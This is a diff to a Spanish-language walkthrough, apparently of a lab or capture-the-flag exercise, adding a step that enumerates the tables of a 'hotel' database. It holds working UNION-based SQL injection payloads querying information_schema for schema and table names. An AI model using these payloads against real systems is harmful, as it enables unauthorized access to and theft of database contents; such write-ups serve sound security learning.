@@ -81,9 +81,14 @@ union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-
 ```
 ![Resultado de Nmap](IMG/bd2.png)
 
+Vamos ahora a tratar de enumerar las tablas de la base de datos hotel
 
+```
+union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 0,1-- -
+```
+Esta es la primera tabla de la base de datos de hotel
 
-
+![Resultado de Nmap](IMG/bd3.png)
 
 
 
